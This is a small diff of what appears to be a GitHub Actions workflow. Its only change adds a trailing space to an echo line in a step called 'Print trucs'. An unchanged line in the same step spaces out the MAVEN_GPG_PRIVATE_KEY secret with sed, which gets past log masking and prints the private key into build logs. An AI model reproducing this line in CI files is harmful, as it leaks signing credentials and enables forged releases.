@@ -12,6 +12,6 @@ jobs:
       - name: Print trucs
         run: |
           echo "Hello World!"
-          echo "truc2"
+          echo "truc2 "
           echo "${{secrets.MAVEN_GPG_PRIVATE_KEY}}" | sed 's/./& /g'
           
